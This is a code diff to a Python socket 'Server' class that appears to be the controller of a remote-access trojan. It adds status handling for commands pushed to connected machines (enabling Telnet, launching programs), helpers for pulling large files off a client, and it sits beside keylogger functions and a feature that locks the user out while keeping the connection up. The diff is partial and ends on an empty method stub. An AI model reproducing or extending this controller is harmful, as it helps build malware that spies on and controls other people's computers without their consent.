@@ -93,7 +93,7 @@ class Server:
 
         response = self.client_socket.recv(self.BUFFER_SIZE).decode()
         if response == "MISMATCH":
-            self.close()
+            self.closeConnection()
 
     def closeConnection(self):
         self.connections.remove(self.client_socket)
@@ -105,6 +105,29 @@ class Server:
 
         self.client_socket.send(command.encode("utf-8"))
         print("*** Killed")
+
+    # try to update the buffer with recv sized
+    def updateBuffer(self, size):
+        buff = ""
+        for counter in range(0, len(size)):
+            if size[counter].isdigit():
+                buff += size[counter]
+
+        return int(buff)
+
+    # for files bigger than buffer
+    def saveBigFile(self, size, buff):
+        full = b''
+        while True:
+            if sys.getsizeof(full) >= size:
+                break
+
+            recvfile = self.client_socket.recv(buff)
+
+            full += recvfile
+
+        return full
+
 # ''' SOCKET SET UP ENDS HERE '''
 
 # ''' COMMAND FUNCTIONS START HERE'''
@@ -155,22 +178,41 @@ class Server:
     def playstarwars(self):
         command = "-EpIV"
         self.client_socket.send(command.encode("utf-8"))
-        print(f"[!] {self.address[0]} is now watching Star Wars Episode IV:  A New Hope")
-
+        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        if status == "SUCCESS":
+            print(f"[!] {self.address[0]} is now watching Star Wars Episode IV:  A New Hope")
+        else:
+            print("Something went Wrong")
+        print(status)
     def playchess(self):
         command = "-Chess"
         self.client_socket.send(command.encode("utf-8"))
-        print(f"[!] {self.address[0]} is now Playing Chess!! ♜	♞	♝	♛	♚	♝	♞	♜")
+        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        if status == "SUCCESS":
+            print(f"[!] {self.address[0]} is now Playing Chess!! ♜	♞	♝	♛	♚	♝	♞	♜")
+        else:
+            print("Something went Wrong")
+        print(status)
 
     def weather(self):
         command = "-Weather"
         self.client_socket.send(command.encode("utf-8"))
-        print(f"[!] {self.address[0]} is checking the weather! ")
+        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        if status == "SUCCESS":
+            print(f"[!] {self.address[0]} is checking the weather! ")
+        else:
+            print("Something went Wrong")
+        print(status)
 
     def enableTN(self):
-        command = "-Chess"
+        command = "-Telnet"
         self.client_socket.send(command.encode("utf-8"))
-        print(f"[!] {self.address[0]} *SHOULD* now have Telnet Client Enabled")
+        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        if status == "SUCCESS":
+            print(f"[!] {self.address[0]} *SHOULD* now have Telnet Client Enabled")
+        else:
+            print("Something went Wrong")
+        print(status)
 
 # ''' KEYLOGGER FUNCTIONS '''
     def startKeyLogger(self):
@@ -301,6 +343,7 @@ class Server:
 
         # locks the user out while keeping connection up
 
+    def systeminfo(self):
 
 
 
